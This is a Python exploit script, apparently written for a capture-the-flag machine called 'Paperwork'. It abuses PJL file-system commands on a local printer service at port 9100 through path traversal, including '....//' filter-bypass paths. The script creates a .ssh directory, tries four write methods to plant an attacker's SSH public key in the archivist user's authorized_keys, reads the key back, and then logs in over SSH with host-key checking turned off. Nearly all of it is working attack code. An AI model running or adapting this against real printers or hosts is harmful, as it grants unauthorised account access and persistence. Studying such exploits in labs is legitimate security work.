#!/usr/bin/env python3
"""
Paperwork — traversal + SSH key overwrite test (run ON target as lp, one session).
"""
import socket
import subprocess
import sys

HOST, PORT = "127.0.0.1", 9100
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)

PATHS = [
    "../.ssh/authorized_keys",
    "../../.ssh/authorized_keys",
    "logs/../../.ssh/authorized_keys",
    "....//....//home/archivist/.ssh/authorized_keys",
]


def pjl(cmd: bytes, body: bytes = b"", timeout: float = 6.0) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(cmd + body)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > 200000:
                break
    except socket.timeout:
        pass
    s.close()
    return out


def alive() -> bool:
    try:
        r = pjl(b"@PJL INFO ID\r\n", timeout=3)
        return b"LASERJET" in r or len(r) > 0
    except Exception as e:
        print("alive_err", e)
        return False


def main() -> None:
    print("=== 9100 alive ===", alive())
    if not alive():
        sys.exit(1)

    print("\n=== traversal FSQUERY ===")
    for q in (
        b'@PJL FSQUERY NAME=".."\r\n',
        b'@PJL FSQUERY NAME="../.ssh"\r\n',
        b'@PJL FSQUERY NAME="logs/.."\r\n',
    ):
        r = pjl(q)
        print(q[:40], "->", r[:300].decode(errors="replace").replace("\r", "\\r"))

    print("\n=== prep mkdir/chmod ===")
    for c in (
        b'@PJL FSMKDIR NAME="../.ssh"\r\n',
        b'@PJL FSCHMOD NAME="../.ssh" MODE=700\r\n',
        b'@PJL FSDELETE NAME="../.ssh/authorized_keys"\r\n',
    ):
        print(c.strip(), "->", pjl(c)[:80])

    path = PATHS[0]
    print("\n=== write methods path=", path, "N=", N, "===")

    writes = [
        (
            "FSUPLOAD_2line",
            f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY,
        ),
        (
            "FSAPPEND_2line",
            f'@PJL FSAPPEND NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY,
        ),
        (
            "FSDOWNLOAD_BINARY",
            f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE={N} NAME="{path}"\r\n'.encode() + KEY,
        ),
        (
            "FSWRT_2line",
            f'@PJL FSWRT NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY,
        ),
    ]

    for name, payload in writes:
        r = pjl(payload, timeout=8)
        print(name, "resp", repr(r[:120]))
        # verify listing (SIZE in query)
        q = pjl(f'@PJL FSQUERY NAME="../.ssh"\r\n'.encode())
        print("  query", q[:200].decode(errors="replace").replace("\r", "\\r"))

    print("\n=== traversal paths (FSUPLOAD write only) ===")
    for p in PATHS[1:]:
        payload = f'@PJL FSUPLOAD NAME="{p}"\r\nSIZE={N}\r\n'.encode() + KEY
        r = pjl(payload, timeout=5)
        print(p, "->", repr(r[:100]))

    print("\n=== read-back (download semantics) ===")
    for spec in (
        f'@PJL FSDOWNLOAD NAME="{path}"\r\nSIZE={N}\r\n',
        f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={N}\r\nOFFSET=0\r\n',
        f'@PJL FSDOWNLOAD NAME="{path}"\r\n',
    ):
        r = pjl(spec.encode(), timeout=5)
        body = r
        if b"FILEERROR" in r:
            print(spec[:50], "FILEERROR")
        elif len(r) > 50:
            print(spec[:50], "len", len(r), "head", repr(r[:80]))
            if KEY.strip() in r:
                print("  *** KEY MATERIAL IN RESPONSE ***")
        else:
            print(spec[:50], repr(r))

    print("\n=== ssh test from lp (127.0.0.1, key /tmp/id_ed25519) ===")
    key_path = "/tmp/id_ed25519"
    try:
        cp = subprocess.run(
            [
                "ssh",
                "-o",
                "BatchMode=yes",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-i",
                key_path,
                "archivist@127.0.0.1",
                "id; wc -c ~/.ssh/authorized_keys 2>/dev/null",
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        print("rc", cp.returncode, "out", cp.stdout[:300], "err", cp.stderr[:300])
    except Exception as e:
        print("ssh_err", e)

    # fallback: only check if archivist key file size via FSQUERY
    final_q = pjl(b'@PJL FSQUERY NAME="../.ssh"\r\n')
    print("\n=== final FSQUERY ../.ssh ===")
    print(final_q.decode(errors="replace"))


if __name__ == "__main__":
    main()